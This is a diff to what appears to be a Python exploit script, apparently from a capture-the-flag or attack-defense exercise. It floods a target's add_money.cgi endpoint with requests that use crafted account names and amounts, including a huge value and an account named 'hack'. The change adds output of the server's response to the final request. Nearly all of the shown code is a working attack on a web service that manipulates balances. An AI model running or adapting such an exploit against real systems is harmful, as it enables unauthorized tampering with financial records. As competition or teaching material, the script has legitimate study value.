@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 import requests
 import sys
 import random
@@ -9,7 +11,7 @@ login = str(random.randint(0, 10000000000))
 
 print("Login:", login)
 
-def send_add_money_req(addr, login, account, amount):
+def send_add_money_req(addr, login, account, amount, show=False):
 	try:
 		resp = requests.get("http://%s/add_money.cgi" % addr, 
 			params={"login": login, "account": account, "amount": amount})
@@ -17,6 +19,9 @@ def send_add_money_req(addr, login, account, amount):
 		success = "Successful" in resp.text
 		if success:
 			print('.', end="")
+			sys.stdout.flush()
+		if show:
+			print(resp.text)
 		return success
 	except:
 		print("Failed")
@@ -70,11 +75,11 @@ send_add_money_req(addr, login, "bay_spl_q_787388", 1);
 send_add_money_req(addr, login, "bay_spl_q_893989", 1);
 send_add_money_req(addr, login, "bay_spl_q_726639", 1);
 send_add_money_req(addr, login, "bay_spl_q_6244081", 281444908722432);
-send_add_money_req(addr, login, "hack", 1);
+send_add_money_req(addr, login, "hack", 1, True);
 
-print("")
-print("")
-print("Try http://%s/add_money.cgi?login=%s&account=aaa&amount=100" % (addr, login))
+# print("")
+# print("")
+# print("Try http://%s/add_money.cgi?login=%s&account=aaa&amount=100" % (addr, login))
 
 
 # send_request = 
